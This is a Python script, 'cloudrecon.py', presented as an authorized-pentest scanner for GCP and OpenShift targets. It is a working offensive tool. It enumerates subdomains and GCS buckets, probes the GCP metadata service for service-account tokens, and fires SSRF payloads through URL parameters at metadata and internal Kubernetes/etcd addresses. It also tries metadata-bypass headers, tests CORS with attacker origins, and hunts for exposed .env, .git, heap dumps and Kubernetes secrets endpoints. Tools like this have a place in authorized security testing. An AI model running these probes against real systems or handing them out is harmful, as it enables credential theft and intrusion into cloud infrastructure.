#!/usr/bin/env python3
"""
cloudrecon.py  –  GCP + OpenShift Cloud Recon & Attack Surface Mapper
======================================================================
For Authorized Pentests Only.

What it does (in order):
  1.  DNS recon         – resolve target, find related subdomains
  2.  GCP metadata      – probe IMDS endpoint (169.254.169.254)
  3.  GCP bucket enum   – guess buckets from org/app name patterns
  4.  GCP bucket access – check public read/write/list on found buckets
  5.  OpenShift recon   – API server discovery, version, exposed routes
  6.  K8s/OCP endpoints – common unauthenticated API paths
  7.  OCP OAuth         – token endpoint, implicit flow misconfig
  8.  SSRF probes       – try to hit metadata via app endpoints
  9.  Header injection  – cloud-specific headers (metadata bypass)
  10. JWT analysis      – decode and inspect any Bearer tokens provided
  11. Exposed dashboards– Grafana, Prometheus, Kibana, OCP console
  12. Sensitive paths   – /.well-known, /actuator, /metrics, /debug
  13. CORS misconfig    – cross-origin on API endpoints
  14. Log everything    – structured log per module in ./cloudrecon_<ts>/

Usage:
  python3 cloudrecon.py -t host
  python3 cloudrecon.py -t TARGET -c "c1=abc123; c2=xyz"
  python3 cloudrecon.py -t TARGET -c "COOKIE" --token "Bearer eyJ..."
  python3 cloudrecon.py -t TARGET -c "COOKIE" --org-name "mycompany"
  python3 cloudrecon.py -t TARGET --modules dns,gcp,ocp,ssrf
"""

import argparse
import base64
import ipaddress
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════
#  COLOURS
# ═══════════════════════════════════════════════
R   = "\033[91m"
G   = "\033[92m"
Y   = "\033[93m"
B   = "\033[94m"
M   = "\033[95m"
C   = "\033[96m"
W   = "\033[97m"
DIM = "\033[2m"
RST = "\033[0m"

BANNER = f"""{B}
   ____ _                 _   ____
  / ___| | ___  _   _  __| | |  _ \\ ___  ___ ___  _ __
 | |   | |/ _ \\| | | |/ _` | | |_) / _ \\/ __/ _ \\| '_ \\
 | |___| | (_) | |_| | (_| | |  _ <  __/ (_| (_) | | | |
  \\____|_|\\___/ \\__,_|\\__,_| |_| \\_\\___|\\___\\___/|_| |_|
{C}  GCP + OpenShift Recon & Attack Surface  |  Authorized Use Only{RST}
"""

# ═══════════════════════════════════════════════
#  CONSTANTS
# ═══════════════════════════════════════════════

GCP_METADATA_URL  = "http://169.254.169.254/computeMetadata/v1/"
GCP_METADATA_HEADERS = {"Metadata-Flavor": "Google"}

# GCP bucket patterns to try based on org/app name
BUCKET_PATTERNS = [
    "{name}",
    "{name}-backup",
    "{name}-backups",
    "{name}-dev",
    "{name}-prod",
    "{name}-staging",
    "{name}-data",
    "{name}-assets",
    "{name}-static",
    "{name}-uploads",
    "{name}-logs",
    "{name}-config",
    "{name}-secrets",
    "{name}-tf",
    "{name}-terraform",
    "{name}-k8s",
    "{name}-gcp",
    "{name}-storage",
    "{name}.appspot.com",
    "{name}-public",
    "{name}-private",
]

# OpenShift / Kubernetes unauthenticated paths
OCP_UNAUTH_PATHS = [
    "/version",
    "/api",
    "/apis",
    "/api/v1",
    "/healthz",
    "/readyz",
    "/livez",
    "/metrics",
    "/.well-known/oauth-authorization-server",
    "/.well-known/openid-configuration",
    "/oauth/authorize",
    "/oauth/token",
    "/openapi/v2",
    "/swagger-ui",
    "/swagger.json",
    "/apis/route.openshift.io/v1",
    "/apis/project.openshift.io/v1",
    "/oapi/v1",
    "/console",
    "/api/v1/namespaces",
    "/api/v1/pods",
    "/api/v1/secrets",
    "/api/v1/configmaps",
    "/api/v1/serviceaccounts",
]

# Exposed service dashboards to look for
DASHBOARD_PATHS = [
    ("/", "Grafana", ["grafana", "d/", "dashboard"]),
    ("/", "Prometheus", ["prometheus", "graph", "tsdb"]),
    ("/app/kibana", "Kibana", ["kibana", "elastic"]),
    ("/actuator", "Spring Actuator", ["actuator", "health", "beans"]),
    ("/actuator/env", "Spring Env", ["systemProperties", "propertySources"]),
    ("/actuator/heapdump", "Heap Dump", []),
    ("/actuator/mappings", "Spring Mappings", ["dispatcherServlets"]),
    ("/debug/pprof", "Go pprof", ["goroutine", "heap", "profile"]),
    ("/debug/vars", "Go expvar", ["cmdline", "memstats"]),
    ("/metrics", "Metrics", ["go_goroutines", "process_cpu", "http_requests"]),
    ("/__debug/", "Debug", ["debug"]),
    ("/console", "OCP Console", ["openshift", "console"]),
    ("/admin", "Admin panel", ["admin", "dashboard", "login"]),
]

# SSRF targets to probe via app endpoints
SSRF_TARGETS = [
    # GCP metadata
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    "http://metadata.google.internal/",
    # Internal ranges
    "http://10.0.0.1/",
    "http://192.168.1.1/",
    "http://172.16.0.1/",
    # OCP API server (common internal address)
    "https://kubernetes.default.svc/version",
    "https://kubernetes.default.svc.cluster.local/version",
    "https://openshift.default.svc/version",
    # OCP etcd (if exposed)
    "http://127.0.0.1:2379/version",
    "http://localhost:2379/members",
]

# Headers that may bypass metadata protection
METADATA_BYPASS_HEADERS = [
    {"Metadata-Flavor": "Google"},
    {"X-Google-Metadata-Request": "True"},
    {"X-Forwarded-For": "169.254.169.254"},
    {"X-Real-IP": "169.254.169.254"},
    {"X-Originating-IP": "169.254.169.254"},
    {"X-Remote-IP": "169.254.169.254"},
    {"Host": "169.254.169.254"},
]

# CORS origins to test
CORS_TEST_ORIGINS = [
    "https://evil.com",
    "https://attacker.com",
    "null",
    "https://TARGET.attacker.com",
]

# ═══════════════════════════════════════════════
#  LOGGER
# ═══════════════════════════════════════════════

class Logger:
    def __init__(self, outdir: Path):
        self.outdir = outdir
        self.outdir.mkdir(parents=True, exist_ok=True)
        self.main_log = outdir / "summary.log"
        self._fh = open(self.main_log, "w")

    def _write(self, level: str, module: str, msg: str, colour: str):
        line = f"[{datetime.now().strftime('%H:%M:%S')}] [{level:8s}] [{module:12s}] {msg}"
        print(f"{colour}{line}{RST}")
        self._fh.write(line + "\n")
        self._fh.flush()

    def info(self, module, msg):    self._write("INFO",    module, msg, B)
    def good(self, module, msg):    self._write("FOUND",   module, msg, G)
    def warn(self, module, msg):    self._write("WARN",    module, msg, Y)
    def vuln(self, module, msg):    self._write("VULN",    module, msg, R)
    def dim(self, module, msg):     self._write("CHECK",   module, msg, DIM)

    def save(self, module: str, data: dict):
        """Save structured finding to module-specific JSON file."""
        fpath = self.outdir / f"{module}.json"
        existing = []
        if fpath.exists():
            try:
                existing = json.loads(fpath.read_text())
            except Exception:
                existing = []
        existing.append(data)
        fpath.write_text(json.dumps(existing, indent=2))

    def close(self):
        self._fh.close()


# ═══════════════════════════════════════════════
#  HTTP HELPERS
# ═══════════════════════════════════════════════

def req(method: str, url: str, cookies: str = "",
        headers: dict = None, proxy: str = None,
        timeout: int = 10, **kwargs) -> Optional[requests.Response]:
    hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    if cookies:
        hdrs["Cookie"] = cookies
    if headers:
        hdrs.update(headers)
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    try:
        return requests.request(
            method, url, headers=hdrs, proxies=proxies,
            verify=False, timeout=timeout,
            allow_redirects=False, **kwargs)
    except Exception:
        return None


def get(url, **kwargs):  return req("GET",  url, **kwargs)
def post(url, **kwargs): return req("POST", url, **kwargs)


def parse_cookies(cookie_str: str) -> dict:
    out = {}
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            out[k.strip()] = v.strip()
    return out


# ═══════════════════════════════════════════════
#  MODULE 1 — DNS RECON
# ═══════════════════════════════════════════════

def module_dns(target: str, log: Logger, outdir: Path):
    log.info("DNS", f"Resolving {target}")

    # Main resolution
    try:
        ip = socket.gethostbyname(target)
        log.good("DNS", f"  {target} → {ip}")
        log.save("dns", {"host": target, "ip": ip})
    except Exception as e:
        log.warn("DNS", f"  Resolution failed: {e}")
        ip = None

    # Reverse DNS
    if ip:
        try:
            rev = socket.gethostbyaddr(ip)
            log.good("DNS", f"  Reverse: {ip} → {rev[0]}")
        except Exception:
            pass

    # Extract domain components for subdomain guessing
    parts  = target.split(".")
    domain = ".".join(parts[-3:]) if len(parts) >= 3 else target

    # Common subdomains to check
    prefixes = [
        "api", "admin", "console", "dashboard", "grafana", "prometheus",
        "kibana", "jenkins", "gitlab", "registry", "harbor", "vault",
        "argo", "argocd", "tekton", "logging", "monitoring",
        "oauth", "sso", "auth", "identity",
        "dev", "staging", "test", "uat",
        "s3", "storage", "backup", "cdn",
        "internal", "mgmt", "management",
    ]

    log.info("DNS", f"Probing {len(prefixes)} subdomains of {domain}")
    found = []
    for prefix in prefixes:
        host = f"{prefix}.{domain}"
        try:
            sub_ip = socket.gethostbyname(host)
            log.good("DNS", f"  FOUND: {host} → {sub_ip}")
            found.append({"host": host, "ip": sub_ip})
            log.save("dns", {"host": host, "ip": sub_ip, "type": "subdomain"})
        except Exception:
            pass

    return ip, found


# ═══════════════════════════════════════════════
#  MODULE 2 — GCP METADATA (IMDS)
# ═══════════════════════════════════════════════

def module_gcp_metadata(target: str, cookies: str, proxy: str,
                         log: Logger, outdir: Path):
    """
    Try to reach GCP IMDS both directly (if we're on the instance)
    and via SSRF through the target app.
    """
    log.info("GCP-META", "Probing GCP Instance Metadata Service")

    metadata_paths = [
        "instance/",
        "instance/service-accounts/",
        "instance/service-accounts/default/",
        "instance/service-accounts/default/token",
        "instance/service-accounts/default/email",
        "instance/service-accounts/default/scopes",
        "instance/hostname",
        "instance/id",
        "instance/zone",
        "instance/machine-type",
        "project/",
        "project/project-id",
        "project/numeric-project-id",
    ]

    for path in metadata_paths:
        url = f"http://169.254.169.254/computeMetadata/v1/{path}"
        r   = get(url, headers=GCP_METADATA_HEADERS, timeout=3)
        if r and r.status_code == 200:
            log.vuln("GCP-META", f"DIRECT METADATA ACCESS: {url}")
            log.vuln("GCP-META", f"  Response: {r.text[:300]}")
            log.save("gcp_metadata", {
                "type": "direct_imds", "url": url,
                "response": r.text[:500]
            })


# ═══════════════════════════════════════════════
#  MODULE 3 — GCP BUCKET ENUM
# ═══════════════════════════════════════════════

def module_gcp_buckets(target: str, org_name: str,
                        log: Logger, outdir: Path):
    log.info("GCP-BUCK", f"Enumerating GCP buckets for org: {org_name}")

    # Extract name candidates from target + org
    candidates = set()
    parts = target.split(".")
    for p in parts:
        if len(p) > 2 and p not in ("apps", "ocp", "gcp", "com", "io", "fra"):
            candidates.add(p)
    if org_name:
        candidates.add(org_name)
        candidates.add(org_name.lower().replace(" ", "-"))
        candidates.add(org_name.lower().replace(" ", "_"))

    buckets_to_test = []
    for name in candidates:
        for pattern in BUCKET_PATTERNS:
            buckets_to_test.append(pattern.format(name=name))

    log.info("GCP-BUCK", f"Testing {len(buckets_to_test)} bucket names")

    for bucket in buckets_to_test:
        # GCS public access check
        urls = [
            f"https://storage.googleapis.com/{bucket}",
            f"https://{bucket}.storage.googleapis.com",
            f"https://storage.googleapis.com/storage/v1/b/{bucket}",
        ]
        for url in urls:
            r = get(url, timeout=6)
            if r is None:
                continue
            if r.status_code == 200:
                log.vuln("GCP-BUCK", f"PUBLIC BUCKET FOUND: {url}")
                log.save("gcp_buckets", {
                    "bucket": bucket, "url": url,
                    "status": r.status_code, "body": r.text[:500],
                    "severity": "HIGH"
                })
            elif r.status_code == 403:
                log.warn("GCP-BUCK", f"  EXISTS but private (403): {bucket}")
                log.save("gcp_buckets", {
                    "bucket": bucket, "url": url,
                    "status": 403, "note": "Bucket exists but not public"
                })
            elif r.status_code == 400:
                # Try write test
                log.dim("GCP-BUCK", f"  400 on {bucket} — skip")

        time.sleep(0.05)


# ═══════════════════════════════════════════════
#  MODULE 4 — OPENSHIFT / K8S RECON
# ═══════════════════════════════════════════════

def module_ocp_recon(target: str, cookies: str, proxy: str,
                      log: Logger, outdir: Path):
    log.info("OCP", "Probing OpenShift/Kubernetes API endpoints")

    # Try API server on common ports
    api_hosts = [
        f"https://api.{'.'.join(target.split('.')[1:])}",  # api.ocp.cs...
        f"https://{target}",
        f"https://api.{target}",
        f"https://console-openshift-console.{target}",
    ]

    for api_host in api_hosts:
        for path in OCP_UNAUTH_PATHS:
            url = f"{api_host}{path}"
            r   = get(url, cookies=cookies, proxy=proxy, timeout=8)
            if r is None:
                continue

            is_interesting = (
                r.status_code in (200, 201) or
                (r.status_code == 403 and "kubernetes" in r.text.lower()) or
                (r.status_code == 401 and "openshift" in r.text.lower())
            )

            if r.status_code == 200:
                log.vuln("OCP", f"UNAUTHENTICATED ACCESS: {url}")
                log.save("ocp_recon", {
                    "url": url, "status": r.status_code,
                    "body": r.text[:500], "severity": "HIGH"
                })
            elif r.status_code in (401, 403) and is_interesting:
                log.warn("OCP", f"  Exists (auth required): {url} [{r.status_code}]")
                log.save("ocp_recon", {
                    "url": url, "status": r.status_code,
                    "note": "Endpoint exists, auth required"
                })

            # Check for version disclosure
            if r.status_code == 200 and any(
                k in r.text for k in ["gitVersion", "major", "minor", "openshift"]
            ):
                log.vuln("OCP", f"  VERSION DISCLOSURE at {url}: {r.text[:200]}")

    # OCP OAuth discovery
    log.info("OCP", "Checking OAuth/OIDC configuration")
    oauth_urls = [
        f"https://{target}/.well-known/oauth-authorization-server",
        f"https://{target}/.well-known/openid-configuration",
        f"https://oauth-openshift.{'.'.join(target.split('.')[1:])}/.well-known/oauth-authorization-server",
    ]
    for url in oauth_urls:
        r = get(url, cookies=cookies, proxy=proxy, timeout=8)
        if r and r.status_code == 200:
            log.vuln("OCP", f"OAUTH CONFIG EXPOSED: {url}")
            try:
                data = r.json()
                log.vuln("OCP", f"  issuer: {data.get('issuer','?')}")
                log.vuln("OCP", f"  token_endpoint: {data.get('token_endpoint','?')}")
                log.save("ocp_oauth", {"url": url, "config": data})
            except Exception:
                log.save("ocp_oauth", {"url": url, "body": r.text[:500]})


# ═══════════════════════════════════════════════
#  MODULE 5 — SSRF PROBES
# ═══════════════════════════════════════════════

def module_ssrf(target: str, cookies: str, proxy: str,
                ssrf_params: List[str], log: Logger, outdir: Path):
    """
    Try SSRF via URL parameters that the app might fetch.
    Probes GCP metadata, internal K8s API, and common internal IPs.
    """
    log.info("SSRF", f"Probing SSRF via params: {ssrf_params}")

    base_url = f"https://{target}"

    # Common URL-accepting parameters
    url_params = ssrf_params or [
        "url", "redirect", "logout", "next", "return",
        "returnUrl", "redirectUrl", "target", "dest",
        "destination", "source", "src", "link", "href",
        "callback", "webhook", "endpoint", "host",
        "proxy", "fetch", "load", "path", "file",
    ]

    for ssrf_target in SSRF_TARGETS:
        for param in url_params:
            fuzz_url = f"{base_url}?{param}={urllib.parse.quote(ssrf_target)}"
            r = get(fuzz_url, cookies=cookies, proxy=proxy, timeout=8)
            if r is None:
                continue

            # Signs of SSRF success
            ssrf_indicators = [
                "computeMetadata", "service-accounts", "access_token",
                "token_type", "expires_in",
                "kubernetes", "openshift",
                "10.", "172.", "192.168.",
            ]
            body_lower = r.text.lower()
            hit = any(ind.lower() in body_lower for ind in ssrf_indicators)

            if hit:
                log.vuln("SSRF", f"SSRF HIT: param={param} target={ssrf_target}")
                log.vuln("SSRF", f"  URL: {fuzz_url}")
                log.vuln("SSRF", f"  Response: {r.text[:300]}")
                log.save("ssrf", {
                    "param": param, "ssrf_target": ssrf_target,
                    "url": fuzz_url, "response": r.text[:500],
                    "severity": "CRITICAL"
                })
            time.sleep(0.08)

    # Also test with metadata bypass headers on the main endpoint
    log.info("SSRF", "Testing metadata bypass headers on main endpoint")
    for hdrs in METADATA_BYPASS_HEADERS:
        r = get(f"https://{target}/", cookies=cookies,
                headers=hdrs, proxy=proxy, timeout=6)
        if r and "computeMetadata" in r.text:
            log.vuln("SSRF", f"METADATA BYPASS via header: {hdrs}")
            log.save("ssrf", {"type": "header_bypass", "headers": hdrs,
                               "response": r.text[:300]})


# ═══════════════════════════════════════════════
#  MODULE 6 — JWT ANALYSIS
# ═══════════════════════════════════════════════

def module_jwt(token: str, log: Logger, outdir: Path):
    if not token:
        return
    log.info("JWT", "Analysing provided token")

    raw = token.replace("Bearer ", "").strip()
    parts = raw.split(".")
    if len(parts) != 3:
        log.warn("JWT", "Not a standard JWT (not 3 parts)")
        return

    def b64d(s):
        s += "=" * (4 - len(s) % 4)
        try:
            return json.loads(base64.urlsafe_b64decode(s))
        except Exception:
            return {}

    header  = b64d(parts[0])
    payload = b64d(parts[1])

    log.good("JWT", f"  Algorithm : {header.get('alg','?')}")
    log.good("JWT", f"  Type      : {header.get('typ','?')}")

    # Check for weak/none algorithm
    alg = header.get("alg", "").upper()
    if alg == "NONE":
        log.vuln("JWT", "ALGORITHM=NONE — token not verified!")
    elif alg in ("HS256", "HS384", "HS512"):
        log.warn("JWT", f"Symmetric algorithm {alg} — check for weak secret")
    elif alg in ("RS256", "RS384", "RS512", "ES256"):
        log.good("JWT", f"Asymmetric algorithm {alg} — standard for AAD")

    # Decode claims
    for k, v in payload.items():
        log.good("JWT", f"  {k:20s}: {str(v)[:100]}")

    # Check expiry
    exp = payload.get("exp")
    if exp:
        remaining = exp - time.time()
        if remaining < 0:
            log.vuln("JWT", f"TOKEN EXPIRED {abs(remaining/60):.0f} min ago")
        else:
            log.good("JWT", f"Token valid for {remaining/60:.0f} more minutes")

    # Check for sensitive claims
    sensitive = ["password", "secret", "key", "pwd", "credential"]
    for k in payload:
        if any(s in k.lower() for s in sensitive):
            log.vuln("JWT", f"SENSITIVE CLAIM in token: {k}={payload[k]}")

    log.save("jwt", {"header": header, "payload": payload,
                      "alg": alg, "expires_in_seconds": exp - time.time() if exp else None})


# ═══════════════════════════════════════════════
#  MODULE 7 — EXPOSED DASHBOARDS
# ═══════════════════════════════════════════════

def module_dashboards(target: str, cookies: str, proxy: str,
                       log: Logger, outdir: Path):
    log.info("DASH", "Probing for exposed dashboards and debug endpoints")

    base = f"https://{target}"
    for path, name, indicators in DASHBOARD_PATHS:
        url = f"{base}{path}"
        r   = get(url, cookies=cookies, proxy=proxy, timeout=8)
        if r is None:
            continue

        found = False
        if r.status_code == 200:
            if not indicators:
                found = True
            else:
                found = any(ind.lower() in r.text.lower() for ind in indicators)

        if found:
            log.vuln("DASH", f"{name} EXPOSED: {url} [{r.status_code}]")
            log.save("dashboards", {
                "name": name, "url": url,
                "status": r.status_code, "body": r.text[:300],
                "severity": "HIGH"
            })
        elif r.status_code in (401, 403):
            log.warn("DASH", f"  {name} exists (auth): {url} [{r.status_code}]")
            log.save("dashboards", {
                "name": name, "url": url, "status": r.status_code,
                "note": "Exists but requires auth"
            })
        time.sleep(0.05)


# ═══════════════════════════════════════════════
#  MODULE 8 — CORS MISCONFIG
# ═══════════════════════════════════════════════

def module_cors(target: str, cookies: str, proxy: str,
                log: Logger, outdir: Path):
    log.info("CORS", "Testing CORS misconfigurations")

    test_urls = [
        f"https://{target}/",
        f"https://{target}/api",
        f"https://{target}/api/v1",
        f"https://{target}/api/v1/user",
    ]

    for url in test_urls:
        for origin in CORS_TEST_ORIGINS:
            origin_actual = origin.replace("TARGET", target)
            r = get(url, cookies=cookies, proxy=proxy,
                    headers={"Origin": origin_actual}, timeout=8)
            if r is None:
                continue

            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")

            if acao == "*":
                log.warn("CORS", f"  Wildcard ACAO at {url}")
            elif acao == origin_actual:
                if acac.lower() == "true":
                    log.vuln("CORS", f"CORS MISCONFIGURATION: {url}")
                    log.vuln("CORS", f"  Origin reflected + credentials=true")
                    log.vuln("CORS", f"  Origin tested: {origin_actual}")
                    log.save("cors", {
                        "url": url, "origin": origin_actual,
                        "acao": acao, "acac": acac,
                        "severity": "HIGH"
                    })
                else:
                    log.warn("CORS", f"  Origin reflected (no creds): {url} ← {origin_actual}")
            time.sleep(0.05)


# ═══════════════════════════════════════════════
#  MODULE 9 — SENSITIVE PATHS
# ═══════════════════════════════════════════════

def module_sensitive_paths(target: str, cookies: str, proxy: str,
                            log: Logger, outdir: Path):
    log.info("PATHS", "Probing sensitive paths")

    sensitive_paths = [
        "/.env", "/.env.local", "/.env.prod", "/.env.backup",
        "/config.json", "/config.yaml", "/config.yml",
        "/application.properties", "/application.yaml",
        "/.git/config", "/.git/HEAD",
        "/backup.zip", "/backup.tar.gz", "/dump.sql",
        "/robots.txt", "/sitemap.xml",
        "/.well-known/security.txt",
        "/health", "/healthz", "/ping", "/status",
        "/info", "/version", "/build",
        "/swagger-ui.html", "/swagger-ui/", "/api-docs",
        "/openapi.json", "/openapi.yaml",
        "/graphql", "/graphiql", "/__graphql",
        "/trace", "/logfile", "/log",
        "/server-status", "/server-info",   # Apache
        "/phpinfo.php",
        "/__debug__/", "/_debug_toolbar/",  # Django
        "/telescope",                        # Laravel
        "/rails/info/properties",            # Rails
        "/wp-admin/", "/wp-config.php",
        "/adminer.php", "/phpmyadmin/",
        "/solr/", "/elasticsearch/",
        "/_cat/indices", "/_nodes",         # Elasticsearch
        "/etcd/",
        "/secrets/",
        "/private/",
        "/internal/",
    ]

    for path in sensitive_paths:
        url = f"https://{target}{path}"
        r   = get(url, cookies=cookies, proxy=proxy, timeout=6)
        if r is None:
            continue

        if r.status_code == 200 and len(r.content) > 10:
            log.vuln("PATHS", f"SENSITIVE PATH ACCESSIBLE: {url} [{r.status_code}] len={len(r.content)}")
            log.save("sensitive_paths", {
                "url": url, "status": r.status_code,
                "length": len(r.content), "body": r.text[:500],
                "severity": "HIGH"
            })
        elif r.status_code in (401, 403):
            log.warn("PATHS", f"  Exists (auth): {url}")
        time.sleep(0.03)


# ═══════════════════════════════════════════════
#  MODULE 10 — AAD / SSO RECON
# ═══════════════════════════════════════════════

def module_aad_recon(target: str, cookies: str, proxy: str,
                      log: Logger, outdir: Path):
    """
    Azure AD SSO specific checks — token endpoint, tenant discovery,
    app registration exposure, implicit flow checks.
    """
    log.info("AAD", "Probing Azure AD / SSO configuration")

    # Try to find tenant ID from login flow
    # AAD well-known endpoint
    aad_endpoints = [
        "https://login.microsoftonline.com/common/.well-known/openid-configuration",
        "https://login.microsoftonline.com/organizations/.well-known/openid-configuration",
    ]
    for url in aad_endpoints:
        r = get(url, timeout=8)
        if r and r.status_code == 200:
            try:
                data = r.json()
                log.good("AAD", f"  issuer: {data.get('issuer','?')}")
                log.good("AAD", f"  token_endpoint: {data.get('token_endpoint','?')}")
                log.save("aad", {"url": url, "config": data})
            except Exception:
                pass

    # Check if app exposes tenant ID / client ID in JS
    r = get(f"https://{target}/", cookies=cookies, proxy=proxy, timeout=10)
    if r:
        # Look for AAD artifacts in page source
        patterns = {
            "tenant_id": r'["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']',
            "client_id": r'clientId["\s:]+["\']([^"\']+)["\']',
            "authority":  r'authority["\s:]+["\']([^"\']+)["\']',
        }
        for name, pattern in patterns.items():
            matches = re.findall(pattern, r.text, re.IGNORECASE)
            for m in matches[:3]:
                log.good("AAD", f"  {name} found in page: {m}")
                log.save("aad", {"type": name, "value": m, "source": "page_source"})

    # Check for implicit flow (id_token in URL fragment — phishing risk)
    log.info("AAD", "Checking OAuth redirect URIs for implicit flow risk")
    oauth_paths = [
        "/.well-known/oauth-authorization-server",
        "/.well-known/openid-configuration",
    ]
    for path in oauth_paths:
        r = get(f"https://{target}{path}", cookies=cookies, proxy=proxy, timeout=8)
        if r and r.status_code == 200:
            try:
                data = r.json()
                grant_types = data.get("grant_types_supported", [])
                if "implicit" in grant_types:
                    log.vuln("AAD", f"IMPLICIT FLOW ENABLED at {target}{path}")
                    log.save("aad", {"type": "implicit_flow", "url": f"{target}{path}",
                                      "severity": "MEDIUM"})
                response_types = data.get("response_types_supported", [])
                log.good("AAD", f"  response_types: {response_types}")
            except Exception:
                pass


# ═══════════════════════════════════════════════
#  FINAL REPORT
# ═══════════════════════════════════════════════

def generate_report(outdir: Path, log: Logger):
    report = {"generated": datetime.now().isoformat(), "findings": []}
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}

    for jfile in sorted(outdir.glob("*.json")):
        try:
            data = json.loads(jfile.read_text())
            for item in (data if isinstance(data, list) else [data]):
                sev = item.get("severity", "INFO")
                report["findings"].append({
                    "module": jfile.stem,
                    "severity": sev,
                    "data": item
                })
        except Exception:
            pass

    # Sort by severity
    report["findings"].sort(
        key=lambda x: severity_order.get(x["severity"], 99))

    report_path = outdir / "report.json"
    report_path.write_text(json.dumps(report, indent=2))

    # Print summary
    print(f"\n{W}{'═'*65}{RST}")
    print(f"{W}  FINAL REPORT SUMMARY{RST}")
    print(f"{W}{'═'*65}{RST}")
    by_sev: Dict[str, list] = {}
    for f in report["findings"]:
        by_sev.setdefault(f["severity"], []).append(f)
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        items = by_sev.get(sev, [])
        if items:
            col = {
                "CRITICAL": R, "HIGH": R, "MEDIUM": Y,
                "LOW": B, "INFO": DIM
            }.get(sev, W)
            print(f"{col}  {sev:8s}: {len(items)} finding(s){RST}")
            for item in items[:5]:
                print(f"{col}    [{item['module']:15s}] "
                      f"{str(item['data'])[:80]}{RST}")

    print(f"\n{B}  Full report: {report_path}{RST}")
    print(f"{B}  All logs   : {outdir}/{RST}")


# ═══════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════

ALL_MODULES = ["dns", "gcp", "buckets", "ocp", "ssrf",
               "jwt", "dashboards", "cors", "paths", "aad"]

def main():
    print(BANNER)
    ap = argparse.ArgumentParser(description="GCP + OpenShift Cloud Recon")
    ap.add_argument("-t",  "--target",    required=True,
                    help="Target hostname (e.g. subdomain.apps.ocp.cs.gcp.domain.io)")
    ap.add_argument("-c",  "--cookies",   default="",
                    help='Cookie string from Burp (e.g. "c1=abc; c2=xyz")')
    ap.add_argument("--token",            default="",
                    help="Bearer token for API calls (e.g. 'Bearer eyJ...')")
    ap.add_argument("--org-name",         default="",
                    help="Organisation/app name for bucket guessing")
    ap.add_argument("--proxy",            default=None,
                    help="Proxy host:port (e.g. 127.0.0.1:8080)")
    ap.add_argument("--modules",          default="all",
                    help=f"Comma-separated modules to run (default: all)\n"
                         f"Available: {','.join(ALL_MODULES)}")
    ap.add_argument("--ssrf-params",      default="",
                    help="Extra params to test for SSRF (comma-separated)")
    ap.add_argument("-o", "--outdir",     default=None,
                    help="Output directory (default: ./cloudrecon_<timestamp>)")
    args = ap.parse_args()

    ts     = datetime.now().strftime("%Y%m%d_%H%M%S")
    outdir = Path(args.outdir or f"cloudrecon_{ts}")
    log    = Logger(outdir)

    modules = ALL_MODULES if args.modules == "all" else \
              [m.strip() for m in args.modules.split(",")]

    ssrf_params = [p.strip() for p in args.ssrf_params.split(",") if p.strip()]

    print(f"{B}[*] Target   : {args.target}{RST}")
    print(f"{B}[*] Cookies  : {'SET' if args.cookies else 'NOT SET (unauthenticated)'}{RST}")
    print(f"{B}[*] Token    : {'SET' if args.token else 'not set'}{RST}")
    print(f"{B}[*] Org name : {args.org_name or '(derived from target)'}{RST}")
    print(f"{B}[*] Modules  : {modules}{RST}")
    print(f"{B}[*] Output   : {outdir}/{RST}\n")

    if not args.cookies:
        print(f"{Y}[!] No cookies provided — running unauthenticated only.{RST}")
        print(f"{Y}    Log in manually, grab cookies from Burp, pass with -c{RST}\n")

    # Run modules
    if "dns"        in modules: module_dns(args.target, log, outdir)
    if "gcp"        in modules: module_gcp_metadata(args.target, args.cookies, args.proxy, log, outdir)
    if "buckets"    in modules: module_gcp_buckets(args.target, args.org_name, log, outdir)
    if "ocp"        in modules: module_ocp_recon(args.target, args.cookies, args.proxy, log, outdir)
    if "ssrf"       in modules: module_ssrf(args.target, args.cookies, args.proxy, ssrf_params, log, outdir)
    if "jwt"        in modules: module_jwt(args.token, log, outdir)
    if "dashboards" in modules: module_dashboards(args.target, args.cookies, args.proxy, log, outdir)
    if "cors"       in modules: module_cors(args.target, args.cookies, args.proxy, log, outdir)
    if "paths"      in modules: module_sensitive_paths(args.target, args.cookies, args.proxy, log, outdir)
    if "aad"        in modules: module_aad_recon(args.target, args.cookies, args.proxy, log, outdir)

    generate_report(outdir, log)
    log.close()


if __name__ == "__main__":
    main()
